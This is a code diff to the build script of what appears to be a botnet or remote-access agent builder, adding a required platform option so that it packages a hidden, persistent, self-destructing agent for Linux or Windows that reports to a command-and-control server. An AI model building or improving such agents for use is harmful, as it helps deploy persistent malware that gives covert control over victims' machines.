@@ -5,7 +5,7 @@ import shutil
 import tempfile
 
 
-def build_agent(output, server_url, hello_interval, idle_time, max_failed_connections, persist, tls_verify):
+def build_agent(output, server_url, hello_interval, idle_time, max_failed_connections, persist, tls_verify, platform):
     prog_name = os.path.basename(output)
     working_dir = os.path.join(tempfile.gettempdir(), 'ares')
     if os.path.exists(working_dir):
@@ -25,11 +25,14 @@ def build_agent(output, server_url, hello_interval, idle_time, max_failed_connec
     cwd = os.getcwd()
     os.chdir(working_dir)
     shutil.move('agent.py', prog_name + '.py')
-    os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
     agent_file = os.path.join(working_dir, 'dist', prog_name)
+    if platform == "linux":
+        os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
+    elif platform == "windows":
+        os.system('pyinstaller.exe --noconsole --onefile ' + prog_name + '.py')
+        if not agent_file.endswith(".exe"):
+            agent_file += ".exe"
     os.chdir(cwd)
-    if os.name == "nt" and not agent_file.endswith(".exe"):
-        agent_file += ".exe"
     os.rename(agent_file, output)
     shutil.rmtree(working_dir)
     print("[+] Agent built successfully: %s" % output)
@@ -45,7 +48,13 @@ def main():
     parser.add_argument('--max-failed-connections', type=int, default=5000, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
     parser.add_argument('--persistent', action='store_true', help="Automatically install the agent on first run.")
     parser.add_argument('--no-check-certificate', action='store_true', help="Disable server TLS certificate verification.")
+    parser.add_argument('-p', '--platform', required=True, help="Platform (linux or windows)")
     args = parser.parse_args()
+
+    args.platform = args.platform.lower()
+    if args.platform not in ['linux', 'windows']:
+        print("[!] Invalid plarform, should be windows or linux")
+        exit(1)
 
     build_agent(
         output=args.output,
@@ -54,7 +63,8 @@ def main():
         idle_time=args.idle_time,
         max_failed_connections=args.max_failed_connections,
         persist=args.persistent,
-        tls_verify=(not args.no_check_certificate))
+        tls_verify=(not args.no_check_certificate),
+        platform=args.platform)
 
 
 if __name__ == "__main__":
